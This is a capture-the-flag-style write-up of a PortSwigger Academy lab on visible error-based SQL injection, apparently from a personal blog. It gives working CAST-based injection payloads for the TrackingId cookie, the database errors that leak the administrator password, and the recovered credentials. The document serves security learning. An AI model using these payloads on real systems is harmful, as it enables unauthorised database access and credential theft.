---
slug: "ps-sqli-13"
title: "Visible error based SQL injection"
platform: "PortSwigger"
difficulty: "Medium"
category: ["Web","SQLi"]
date: "2025-12-20"
minutes: 5
visible: true
tldr: "visible error-based SQL injection — solved and documented end to end."
format: "html"
---

<p class="mono lab-crumb">PORTSWIGGER ACADEMY // SQLi SERIES &middot; LAB 13 &middot; <a href="https://github.com/0xWalid/Learnings/tree/main/Portswiggers/01-Sql%20Injection%20Labs/13-%20Visible%20error-based%20SQL%20injection.md" target="_blank" rel="noopener">original notes &#8599;</a></p>
<p>Exploit a <strong>visible error-based SQL injection</strong> vulnerability to extract the <strong>administrator password</strong> by abusing <strong>database error messages</strong>, and use the leaked credentials to solve the lab.</p>
<h2>1. Initial Testing &amp; Vulnerability Identification</h2>
<h2>Parameters Tested</h2>
<ul><li><code>productId</code></li></ul>
<p>The parameter was tested with a single quote (<code>'</code>) and <strong>no abnormal behavior</strong> was observed.</p>
<h2>Cookie-Based Testing</h2>
<p>While inspecting the HTTP request, a custom cookie parameter named <strong><code>TrackingId</code></strong> was identified.</p>
<h2>Observation</h2>
<ul><li>Normal <code>TrackingId</code> → Application behaves normally</li><li>Adding a single quote (<code>'</code>) → <strong>500 Internal Server Error</strong></li></ul>
<h2>Error Message Observed</h2>
<pre class="code" data-lang="sql"><code>Unterminatedstring literal started at position52in SQL
SELECT *FROM trackingWHERE id ='cxo6JUMVbyuRDwl0''.
Expectedchar</code></pre>
<p>This behavior indicates:</p>
<ul><li>User input is directly embedded into a SQL query</li><li>SQL errors are <strong>not suppressed</strong></li><li>The backend reveals query structure and parsing failures</li></ul>
<p>This confirms a <strong>visible error-based SQL injection vulnerability</strong>.</p>
<h2>2. Understanding Why This Is Error-Based SQL Injection</h2>
<p>In this lab:</p>
<ul><li>SQL errors are displayed to the user</li><li>Database parsing and type errors are reflected in responses</li><li>Attacker-controlled input appears inside error messages</li></ul>
<p>This means:</p>
<ul><li>We do <strong>not</strong> need blind boolean inference</li><li>We can directly extract data via <strong>type mismatch and casting errors</strong></li><li>Error messages themselves act as the data leakage channel</li></ul>
<p>The application likely executes a query similar to:</p>
<pre class="code" data-lang="sql"><code>SELECT*FROM tracking
WHERE id='&lt;TrackingId&gt;';</code></pre>
<h2>3. Confirming Injection Control via Errors</h2>
<p>To confirm control over the SQL query, a payload was crafted that forces the database to evaluate an injected expression.</p>
<h2>Payload Used</h2>
<pre class="code" data-lang="sql"><code>TrackingId=' AND 1=cast((select 1) as int) --</code></pre>
<h2>Result</h2>
<ul><li>The payload is evaluated by the database</li><li>SQL processing continues past the injected logic</li><li>Confirms attacker-controlled SQL execution</li></ul>
<p>This proves the injection is exploitable using <strong>error-based techniques</strong>.</p>
<h2>4. Why UNION Is Not Required Here</h2>
<h2>Unnecessary Technique</h2>
<pre class="code" data-lang="sql"><code>UNION SELECT username, password FROM users--</code></pre>
<p><strong>Why this is unnecessary:</strong></p>
<ul><li>Query output is <strong>not rendered into the page</strong></li><li>However, <strong>database errors are fully visible</strong></li><li>Error-based SQLi allows direct data leakage without UNION</li></ul>
<p><strong>Lesson:</strong></p>
<p>When database errors are visible, <strong>error-based extraction is faster and simpler</strong> than UNION or blind techniques.</p>
<h2>5. Why Some Payloads Failed</h2>
<p>Understanding why payloads fail is critical to crafting correct error-based attacks.</p>
<h2>Failed Payload — Invalid SQL Syntax</h2>
<pre class="code" data-lang="sql"><code>TrackingId=' AND 1=(select username in the users Limit 1) --
</code></pre>
<p><strong>Why it fails:</strong></p>
<ul><li>Invalid SQL syntax (<code>IN THE users</code>)</li><li>Query parsing fails before meaningful evaluation</li><li>Results in a generic syntax error</li></ul>
<p><strong>Correct mindset:</strong></p>
<p>Error-based SQLi still requires <strong>valid SQL syntax</strong> to reach exploitable execution paths.</p>
<h2>6. Why Casting Payloads Worked</h2>
<h2>Working Payload Example</h2>
<pre class="code" data-lang="sql"><code>TrackingId=' AND 1=cast((select username from users LIMIT 1) as int) --</code></pre>
<h2>Explanation</h2>
<ul><li><code>username</code> is a string value</li><li>Casting it to <code>int</code> forces a <strong>type mismatch</strong></li><li>PostgreSQL includes the offending value in the error message</li></ul>
<p>This confirms the first user is <strong>administrator</strong>.</p>
<h2>7. SQL Functions Used (Core Concepts)</h2>
<p>This lab relies on <strong>type casting and error propagation</strong>, not boolean inference.</p>
<h2>1️⃣ <code>CAST()</code></h2>
<h2>Syntax</h2>
<pre class="code" data-lang="sql"><code>CAST(expression AS datatype)</code></pre>
<h2>Purpose</h2>
<ul><li>Forces type conversion</li><li>Triggers errors when conversion is invalid</li><li>Leaks data via error messages</li></ul>
<h2>2️⃣ <code>LIMIT</code></h2>
<h2>Syntax</h2>
<pre class="code" data-lang="sql"><code>LIMIT 1</code></pre>
<h2>Purpose</h2>
<ul><li>Ensures subqueries return <strong>exactly one row</strong></li><li>Prevents multi-row subquery errors</li><li>Required for controlled error-based extraction</li></ul>
<p><strong>Key Rule:</strong></p>
<p>&gt; In error-based SQL injection, payloads must be syntactically valid and force the database to include sensitive values inside error messages. &gt;</p>
<h2>8. Password Extraction via Error Messages</h2>
<h2>Payload Used</h2>
<pre class="code" data-lang="sql"><code>TrackingId=' AND 1=cast((select password from users LIMIT 1) as int) --</code></pre>
<h2>Error Message Returned</h2>
<pre class="code" data-lang="sql"><code>ERROR: invalid input syntaxfortypeinteger: "59lftb5j38xy4t8vcyim"</code></pre>
<h2>Result</h2>
<ul><li>The administrator password is leaked <strong>directly in the error message</strong></li><li>No brute force or automation required</li></ul>
<h2>9. Final Result</h2>
<pre class="code" data-lang="text"><code>Username: administrator
Password: 59lftb5j38xy4t8vcyim</code></pre>
<ul><li>Logged in successfully</li><li>Lab completion animation displayed</li><li>Lab marked as solved</li><li>Screenshot:</li><li>&lt;img width="1293" height="260" alt="image" src="https://github.com/user-attachments/assets/362b7c6c-4bc6-42c8-ad53-bced1d294ae3" /&gt;</li></ul>
<h2>10. Future Testing Notes (Important)</h2>
<h2>When Testing SQL Injection:</h2>
<ul><li>Test <strong>all inputs</strong>:</li><li>URL parameters</li><li>POST data</li><li>Cookies</li><li>Headers</li><li>Observe <strong>error behavior early</strong></li><li>Decide attack type:</li><li>Errors visible → Error-based SQLi</li><li>No errors/output → Blind SQLi</li><li>Error-based workflow:</li><li>Trigger syntax error</li><li>Identify DBMS</li><li>Use casting/type mismatches</li><li>Constrain subqueries with <code>LIMIT 1</code></li><li>Common mistakes to avoid:</li><li>Invalid SQL syntax</li><li>Multi-row subqueries</li><li>Assuming character limits instead of syntax issues</li></ul>
<h2>11. Notes for My Future Self</h2>
<ul><li>Visible SQL errors are high-impact vulnerabilities</li><li>Error messages often leak full credentials</li><li>Casting strings to integers is a powerful extraction technique</li><li>Cookies are common SQLi injection points</li><li>Always exploit error-based SQLi before switching to blind methods</li></ul>

<details class="flag-box"><summary><span class="flag-label">LAB STATUS</span><span class="flag-hint"></span></summary><code>SQLi SERIES :: LAB 13 COMPLETE</code></details>
